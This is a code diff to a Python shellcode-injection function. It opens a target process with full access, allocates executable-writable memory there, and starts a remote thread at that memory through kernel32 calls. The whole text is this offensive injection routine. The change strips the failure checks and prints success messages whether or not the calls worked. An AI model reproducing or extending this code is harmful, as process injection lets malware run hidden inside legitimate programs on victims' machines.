@@ -13,9 +13,8 @@ VIRTUAL_MEM        =     ( 0x1000 | 0x2000 )
 def inject( pid, data):
     # Get a handle to the process we are injecting into.
     h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, pid )
-    if not h_process:
-        print(f"[*] Couldn't acquire a handle to PID: {pid}")
-        exit(0)
+    print(f"[*] Acquired the target process handle: {h_process}")
+    
 
     arg_address = kernel32.VirtualAllocEx( h_process, 0, len(data), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
     print(f"[*] Allocated shellcode address: 0x{arg_address:08x}")
@@ -27,11 +26,12 @@ def inject( pid, data):
     parameter = 0
     start_address = arg_address   
     thread_id = c_ulong(0)
-    if not kernel32.CreateRemoteThread(h_process,None,0,start_address,parameter,0,byref(thread_id)):
-        print("[*] Failed to inject the DLL. Exiting.")
-        exit(0)
+    h_remote_thread = kernel32.CreateRemoteThread(h_process,None,0,start_address,parameter,0,byref(thread_id))
+    print(f"[*] Injected remote thread with handle : {h_remote_thread}")
+    
 
     time.sleep(2)
+    kernel32.CloseHandle(h_remote_thread)
     kernel32.CloseHandle(h_process)
 
 
